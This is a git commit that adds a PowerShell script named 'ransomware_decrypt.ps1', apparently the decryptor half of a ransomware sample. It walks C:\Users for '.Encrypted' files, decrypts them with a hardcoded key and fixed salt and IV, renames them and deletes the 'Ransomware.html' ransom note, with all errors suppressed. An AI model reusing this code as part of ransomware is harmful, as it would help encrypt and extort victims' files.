4ff846e1913f666cf989deeef002a512af944b23
Syed Ubaid Ali Jafri <33892624+Ubaidjaffery@users.noreply.github.com>
2021-02-10 03:34:30 -0800

    Create ransomware_decrypt.ps1

---
+++ ransomware_decrypt.ps1
@@ -0,0 +1,42 @@
+$ErrorActionPreference = "SilentlyContinue"
+$web = New-Object Net.WebClient
+$key = "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCvXIGeuwHQzt0XVyRBA9/bCK7j9b4celVVd5ATSr/6Ev6QiBagf+d11l71Eqhznddzgi5+hEB+j5VPJq+4EjdD7JLnVjd/kxd4xkCFjkWsjEY9Vh41kZDoB3F0z92zkwHIx/wVtJJdq6vUX1Q9TMSRjQrA+XpdotSU+2Q/lBP12QIDAQAB"
+
+function Decrypt-File($Encrypted, $Passphrase)
+{
+    $salt="I only need to press one key to run the exploit.";
+    $init="Or, I can press another and disable the entire plan.";
+    $r = new-Object System.Security.Cryptography.RijndaelManaged
+    $pass = [System.Text.Encoding]::UTF8.GetBytes($Passphrase)
+    $salt = [System.Text.Encoding]::UTF8.GetBytes($salt)
+
+    $r.Key = (new-Object Security.Cryptography.PasswordDeriveBytes $pass, $salt, "SHA1", 5).GetBytes(32) #256/8
+    $r.IV = (new-Object Security.Cryptography.SHA1Managed).ComputeHash( [Text.Encoding]::UTF8.GetBytes($init) )[0..15]
+
+    $d = $r.CreateDecryptor()
+    $ms = new-Object IO.MemoryStream @(,$Encrypted)
+    $cs = new-Object Security.Cryptography.CryptoStream $ms,$d,"Read"
+    $sr = new-Object IO.StreamReader $cs
+    Write-Output $sr.ReadToEnd()
+    $sr.Close()
+    $cs.Close()
+    $ms.Close()
+    $r.Clear()
+}
+
+gci C:\Users -Recurse -Include "*.Encrypted" | %{
+
+    try{
+        $file = Get-Content $_;
+        $Encrypt = Decrypt-File $file $key
+        Set-Content -Path $_ -Value $Encrypt
+
+        $newname=$_.name -replace '.Encrypted', '';
+        ren -Path $_.FullName -NewName $newname -Force;
+        
+        $path=$_.DirectoryName+'\Ransomware.html';
+        
+        Remove-Item $path;
+    }
+    catch{}
+}
